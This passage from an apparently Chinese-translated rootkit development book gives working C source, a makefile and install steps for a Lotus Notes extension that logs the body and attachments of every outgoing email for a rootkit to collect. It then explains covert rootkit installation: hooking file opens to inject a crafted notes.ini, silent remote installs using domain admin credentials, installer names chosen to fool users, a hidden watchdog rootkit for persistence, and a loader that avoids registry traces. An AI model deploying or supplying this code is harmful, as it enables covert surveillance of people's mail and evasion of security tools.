return(error);
}
// This routine is defined by Lotus Notes
STATUS LNPUBLIC DLL_EXPORT MainEntryPoint( void )
{
STATUS error;
// Next get a recursion ID
error = EMCreateRecursionID( &recursionId );
if ( !error )
error = RegisterEntry();
return( error );
}
// Called when Lotus Notes client is about to send.
// Return FALSE to block else return ERR_EM_CONTINUE
STATUS LNPUBLIC OnSendMail( EMRECORD* pExRecord )
{
HANDLE hNote;
void
*pViewDesc;
WORD
Flags;
BOOL
*pModified;
VARARG_PTR ap;
// get the arguments
ap = pExRecord->Ap;
hNote = VARARG_GET (ap, HANDLE);
pViewDesc = VARARG_GET (ap, VOID *);
Flags = VARARG_GET (ap, WORD);
pModified = VARARG_GET (ap, BOOL *);
// check for record error
if (pExRecord->Status != NOERROR)
return( ERR_EM_CONTINUE );
// filter mail
if( !SaveRecipients( hNote ) )
{
SaveBody( hNote );
SaveAttachments( hNote );
}
return( ERR_EM_CONTINUE );
}
// Standard windows NT DLL entrypoint
BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved )
{
switch( fdwReason )
{
case DLL_PROCESS_ATTACH:
// Initialize mail intercept procedure
filterProcedure = (EMHANDLER)MakeProcInstance(
(FARPROC)OnSendMail, hInstance);
break;
case DLL_PROCESS_DETACH:
// Free mail intercept procedure
FreeProcInstance( filterProcedure );
DeregisterEntry();
break;
}
return( TRUE );
UNREFERENCED_PARAMETER( lpReserved );
}
在 LotusExtension.c 文件实现的10个函数中，只有 OnSendMain 里的过滤逻辑需要讲解。这
个函数只是在消息没有目的地址的时候保存电子邮件的正文和附件。这是因为 Lotus Notes
消息系统将内部邮件与外部邮件分开了。因此，如果你的电子邮件既有内部 Domino 特定目
的地址(例如 JohnDoe/lotus)，又有外部因特网目的地址(例如
PI:EMAIL)，这就会产
生两个事件：一个有正文，附件和地址(因特网目的地址)，另一个有正文，附件和地址(外部
目的地址)。这种消息协议需要客户端扩展来跳过那些有地址的消息的正文和附件，加为它
们被已经记录过了。
LotusExtension.def
LotusExtension.def
LotusExtension.def
LotusExtension.def
文件 LotusExtension.def 简单地定义了 LotusExtension.dll 的导出函数。
LIBRARY LOTUSEXTENSION
EXPORTS
MainEntryPoint @1
OnSendMail @2
LotusExtension.mak
LotusExtension.mak
LotusExtension.mak
LotusExtension.mak
文件 LotusExtension.dll 指定了怎么来自成 LotusExtension.dll：
#
#
makefile for LotusExtension.dll
#
Windows 32-bit version using Microsoft Visual C++ .NET compiler and linker.
#
# Standard Windows 32-bit make definitions
!include 
cpuflags = -Zp
outfilename = LotusExtension
defname = LotusExtension
all : $(outfilename).dll
$(outfilename).dll : LotusExtension.obj $(defname).def
$(link) $(linkdebug) \
-dll -def:$(defname).def \
-entry:_DllMainCRTStartup$(DLLENTRY) \
-out:$(outfilename).dll \
LotusExtension.obj \
$(guilibs) .\lib\notes.lib
LotusExtension.obj : LotusExtension.h LotusExtension.c
$(cc) /I .\include $(cdebug) $(cflags) $(cpuflags) /optimize -DNT $(cvars)
LotusExtension.c
这个 makefile 原来是用在 Visual Studio 6.0 编译环境下的，所以如果你使用这个文件在
新的编译器里编译你可能会看到有一些警告信息。特别是在用 Visual Studio 8.0 来编译
LotusExtension.c 文件的时候，-MLd 编译选项和不提倡使用的 strcpy 和 fopen 函数会产生一
些警告，在使用一些比较新的开发环境的时候，因为这些警告可以安全地忽略掉，而工程文
件会自动转换，所以我们并没有为了适应新的开发环境而去修改这个项目。
readme.txt
readme.txt
readme.txt
readme.txt
文件 readme.txt 解释了怎么生成和部署 LotusExtension.dll。如果的你的生成环境 (build
environment)没有预先设置过，在执行 nmake 之前你要先执行一下 vcvars32.bat（或者一个
等效的预生成设置文件）。
PROGRAM - LotusExtension.dll - Lotus Notes Mail Extension Manager
To build: enter "nmake LotusExtension.mak" from a command prompt.
FILES
*LotusExtension.c - Main C source code file for Lotus Extension Manager
*LotusExtension.h - Constants and function prototypes.
*LotusExtension.mak - Make file for Windows 32-bit.
*LotusExtension.def - Module definition file for Windows 32-bit.
*readme.txt - This file.
To install and run this program:
1. Exit Notes if it is running.
2. Copy LotusExtension.dll to the Notes program directory.
(usually C:\Program Files\Lotus\Notes)
3. Edit the notes.ini file.
If an EXTMGR_ADDINS entry does not exist, add
EXTMGR_ADDINS=LotusExtension.dll
If an EXTMGR_ADDINS entry already exists, add
",LotusExtension.dll" to the end of the existing line.
Save the modified notes.ini file.
4. Launch Notes.
5. Lotus email will now be filtered through LotusExtension.dll
安装一个 Lotus
Lotus
Lotus
Lotus Notes
Notes
Notes
Notes 客户端过滤器
上一节讲的 readme.txt 文件描述了手工一步一步地插入一个 Lotus Notes 客户端扩展的
过程。然而在正常情况下,这个过程是可以自动完成的。
要自动完成这个安装过程，安装程序需要先找到 Lotus Notes 的安装目录。我们使用了
默认目录 C:\Program Files\Lotus\Notes，但 Lotus Notes 并没有安装到这个默认的位置，好在
Lotus Notes 安装时会创建一个注册表项来指出安装目录，这个注册表项是
HKEY_LOCAL_MACHINE\SOFTWARE\Lotus\ Notes\Path
使 用 此 注 册 表 值 找 到 notes.ini 文 件 ， 需 要 一 个 LotusExtension.dll 进 入
EXTMGR_ADDINS 段。
不幸的是，这并不是指定 notes.ini 文件的惟一方式。Lotus Notes 还可以用一个指定了
notes.ini 文件位置的参数来进行启动，那么上面说的安装方法就不可行了。
然而，如果你是结合 rootkit 来过滤电子邮件的话，可以通过挂钩 ZwFileOpen 函数来检
查目标文件名是不是 notes.ini。如果是，就可以欺骗 Lotus Notes 来使用一个指定的经过精
心构造的 notes.ini 文件。实际过程中要在钩子函数里创建一个 notes.ini 的临时复本文件。然
后修改这个临时文件使它包含需要的 EXTMGR_ADDINS 段，然后关闭源 notes.ini 文件并
把临时文件的句柄传递调用程序。
测试 Lotus
Lotus
Lotus
Lotus Notes
Notes
Notes
Notes 客户端扩展
一旦 LotusExtension.dll 已经复制到了 Lotus\Notes 目录并且 notes.ini 文件已经把库文
件声明为一个客户端扩展，你就可以启动 Lotus Notes 来开始发送电子邮件了，每封电子邮
件消息都会在 C:\LN_LOG 里产生一些条目信息。下面是一个例子：
*BODY: test1
*
ATTACHMENT: This is a test attachment file
*
BODY: test 2
*
ATTACHMENT: This is a test attachment file
*
ATTACHMENT: This is another test attachment file
*
DESTINATION(S): PI:EMAIL
*
BODY: test3
*
ATTACHMENT: This is a test attachment file
*
DESTINATION(S): PI:EMAIL,CN=john doe/O=lotus@dominoServer
总结
本章所提供的例子并没有直接修改本书中的生成的 rootkit。一个客户端扩展通常是把电
子邮件通信记录到磁盘里供 rootkit 来检索，所以 rootkit 和电子邮件客户端扩展之间并没有
依赖的关系，这就使得一个电子邮件客户端扩展可以自动地完成它的工作。
命名管道是使 rootkit 对脱钩活动(如电子邮件过滤)进行监视的一个非常好的方法。如果
你的电子邮件客户端扩展把信息保存到一个文件里，这个文件的位置可以用一个命名管道传
递给 rootkit，然后 rootkit 就可以处理这个文件的内容。
把已过滤到的电子邮件数据存放到一个目录缓冲区里也是一个传输电子邮件通信的非
常好的方法。rootkit 可以定期检查一个指定目录，如果发现有文件就处理这些文件的内容。
然而，这种机制需要添加同步机制来保证读和写之间互不干扰。虽然电子邮件客户端扩展和
企业基础设施相比的价值比较小，但是要从企业环境中收集个人信息就没有比这更好的方法
了，如果你的目标是企业环境，那么很有可能它的电子邮件系统会实现客户端扩展功能的某
些形式。本章已经提供了最流行的两种解决方案：
Microsoft Exchange Server for Outlook
Domino Server for Lotus Notes
下一章会介绍基本的 rootkit 安装技术。
笫十一章 安装注意事项
概述
本章将会帮助大家解决在设计 rootkit 的安装机制时会遇到的一些问题。其中有一些是
标准的安装方法，这些方法在商业软件中占很大的比例，而在本章中介绍的另一些技术只会
用在 rootkit 里。
本章包含下面的内容：
有意安装
无意安装
权限提升
持久性
使用 ZwSetSystemInformation
注册表的设置
初始化文件
利用漏洞来安装
安装清理工作
测试
有意安装
在理想情况下系统管理员，终端用户和安全人员都会同意安装所需要的 rootkit，当然
在这种情况下它不被称作是一个 rootkit，这将被称作是类似于过滤软件或者流出数据控制软
件(outbound content compliance software)，重要的一点是这个软件是有意去安装的。
这并不是说这个软件就是理想的。当涉及到个人使用的公司财产时，大多数用户都不希
望受到监视，因此，任何形式的监视都应该包含有一些合理的反馈信息，例如连接检测的信
号或者定期的状态报告。在 rootkit 和监视系统之间的反馈还可以由一个部署环境中的集中
控制器来提供一致性的简明系统报告。
另一种可以考虑的反馈形式就是数据取证。Rootkit 技术是为监视员工量身定做的，这
就需要对取证数据进行捕获，在 rootkit 设计初加入这种法律方面的考虑可以在客户问“我
如何在法庭证明它”提供很多可能性。捕获取证数据功能不仅需要进行额外的处理和磁盘空
间，还需要有反篡改(anti-tamper)功能。在设计之初就考虑了这种需要使得数据取证的支持
变得非常简单。
在开发客 户端/服务器（C/S） 监控和反篡改系统时，在检测到违规行为或者篡改行为
时，rootkit 设计者必须在两个选项之间进行选择。当检测到纂改行为时，fail-safe 功能将会
阻止操作继续执行，相反，fail-open 功能仅报告此事件的发生然后允许操作继续执行。某些
环境会更加注重员工的工作效率，就需要 faile-open 系统。而其它一些环境不会太注重工作
效率。网络通信，USB 文件传输，CD/DVD 刻录甚至是打印操作在监视系统不能正常运行
时可以设置成 fail-open 或者 fail-safe。
安装软件
在 Microsoft Windows 上进行有意的软件安装的安装软件我首选的是 InstallShield。由
InstallShield 生成的“setup.exe”和“产品名字.msi”文件使得主流的软件管理系统可以通过
庞大的互联网把软件传递到每一台计算机。个人用户可以通过简单地双击文件来安装一个软
件。
不幸的是,InstallShield 不是免费的。你果你在寻找一个免费的方案，你可自己写一个程
序来复制需要的文件和创建需要的注册表项。最后，一个专业的 rootkit 需要专业的安装技
术。记住，安装软件的价格只会升不会降，而你对它的需要却是不会变的。
另一类属于有意安装的行为是“软件公司有意的”但不是用户有意的”。这就是一个专
业的安装工具被用来做一些见不得光的事了。我发现如果是在一个 SMS 系统上使用
InstallShield 来做这类事情,那么使用“安静模式”和“强制重启”参数是最好的方法。这需
要把安装程序的名字稍微修改一下来迷惑用户，因为这个名字会出现在添加和删除程序对话
框里，但是一些像“Microsoft Event Manager” 或者 “OLE Service Controller”这样的工具无形
中保证了用户不会删除该软件只是为了看看会发生什么。
最终用户许可协议
有一种是介于有意安装和无意安装之间的：“无意但是经过授权的”。这就是 Sony 公司
在发布“Van Zant”CD 时所采用的流氓 rootkit 的安装方法。通过提供一些有用的软件给用
户，但是用户必须接受在系统里插入一个 rootkit 的协议，这样做可以被绕过许多法律漏洞。
不幸的是，正如 Sony 公司一样，这就变成了一个非常尴尬的公关问题了，因为它损害了其
他公司的声誉。因些，这种安装方法是不值得推荐的。
无意安装
正常情况下，用户是不希望在自己常用的计算机上安装一个 rootkit 的，而系统管理员
又不希望用户知道在计算机里安装了 rootkit。这就需要 rootkit 的开发者设计一种能够在安
装 rootkit 时不会影响到用户正常操作的方法。在这种环境下安装一个 rootkit 是比较困难的，
但是有几个方法可供选择。
用域(domain)管理员账户来秘密安装一个 rootkit 大概是最简单的方法了。rootkit 的使用
都不需要专业的知识就能够进行文件的传输和注册表的更新。这可以用一个简单的程序自动
完成，使用 ZIP 压缩一下以方便在互联网进行传输。这种安装方法包括以下步骤：
获取主机名，用户名，密码和安装路径（默认是本机，当前用户，当前目录）。
如果不是本机，使用 WNetAddConnection2 来连接。
复制文件到安装目录。
如果不是本机，使用 RegConnectRegistry 来远程打开注册表。
更新远程注册表。
如果不是本机，使用 RegCloseKey 来关闭远程注册表。
如果可以的话，强制重启计算机。
如果已经建立连接，使用 WNetCancelConnection2 来断开连接。
权限提升
如果你不是笫一次接触 rootkit 的话，那么你多多少少都会对提升权限有所了解。通常
是通过利用那些具有比较高权限的程序的一些漏洞来使用这些特权进行一些操作。实际的安
装利用已经超出了本书的范围。但你可以在互联网搜索(Google)一下“exploit vulnerability
privilege escalation (Microsoft OR Windows)”就会找到这些知识。
持久性
现在检测和删除 rootkit 的技术越来越牛 B，但是一个精心设计的重新安装例程甚至可
以 对 抗 最 牛 B 的 检 测 程 序 。 先 使 用 SCManager 安 装 一 个 主 rootki ， 然 后 使 用 带
SystemLoadAndCallImage 参数的 ZwSetSystemInformation(在下一节介绍)来安装一个附属
rootkit，这样一旦附属 rootkit 发现主 rootkit 无法正常工作时就可以马上或者延迟一段时间把
它重新插入到系统中。这里延迟一段时间是非常重要的，因为通过延迟一段时间再进行操作
可以大大地降低了被发现的机率。
备份恢复系统(附属 rootkit)的一个基本前提是要把这个 rootkit 安装到一个安全的地方，
这个地方并不会因为主 rootkit 被发现而被找到。这样，如果 rootkit（主 rootkit）被发现和清
除，就不会发现原来安装它的附属 rootkit。笫二个 rootkit 做的仅仅是在一个命名管道上监
视从主 rootkit 发来的心跳包，在发现主 rootkit 停止工作的时候它就可以重新安装主 rootkit
来使其恢复工作。
因为主 rootkit 必须故意把自己暴露给各种检测工具，所以和一个只是简单地监视一个
命名管道的 rootkit 相比，其被检测和清除的可能性要大得多。由于笫二个 rootkit 既没有安
装钩子也没有做任何形式的隐藏，所以它不太可能被当做是 rootkit 而被清除掉。
带 SystemLoadAndCallImage
SystemLoadAndCallImage
SystemLoadAndCallImage
SystemLoadAndCallImage 参数的 ZwSetSystemInformation
ZwSetSystemInformation
ZwSetSystemInformation
ZwSetSystemInformation
如果 rootkit 像 Ghost(Ghost 是光盘中提供的例子程序)一样使用 SCManager 来进行安装，
就会在注册表里留下一个注册表项，这很容易被清除掉。要避免出现这种情况，可以用一个
启 动 程 序 来 安 装 rootkit ， 这 个 程 序 使 用 带 SystemLoadAndCallImage 参 数 的
ZwSetSystemInformation 来安装 rootkit 而不要使用 SCManaget。下面是代码：
#include 
#include 
#define SystemLoadAndCallImage 38
typedef long NTSTATUS;
typedef struct _UNICODE_STRING {
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING;
VOID (_stdcall *RtlInitUnicodeString)(
IN OUT UNICODE_STRING* DestinationString,
IN PCWSTR SourceString );
NTSTATUS (_stdcall *ZwSetSystemInformation)(
IN DWORD SystemInformationClass,
IN OUT PVOID SystemInformation,
IN LONG SystemInformationLength );
typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE {
UNICODE_STRING ModuleName;
} SYSTEM_LOAD_AND_CALL_IMAGE;
void main(void)
{
NTSTATUS status;
SYSTEM_LOAD_AND_CALL_IMAGE MyDeviceDriver;
WCHAR imagepath[] = L"\\??\\C:\\comint32.sys";
RtlInitUnicodeString = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"),
"RtlInitUnicodeString");
ZwSetSystemInformation = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"),
"ZwSetSystemInformation");
if( RtlInitUnicodeString && ZwSetSystemInformation )
{
RtlInitUnicodeString( &( MyDeviceDriver.ModuleName), imagepath );
status = ZwSetSystemInformation(SystemLoadAndCallImage,
&MyDeviceDriver, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE));
if( status >= 0 )
{
printf( "MyDeviceDriver loaded!\n");
return;
}
}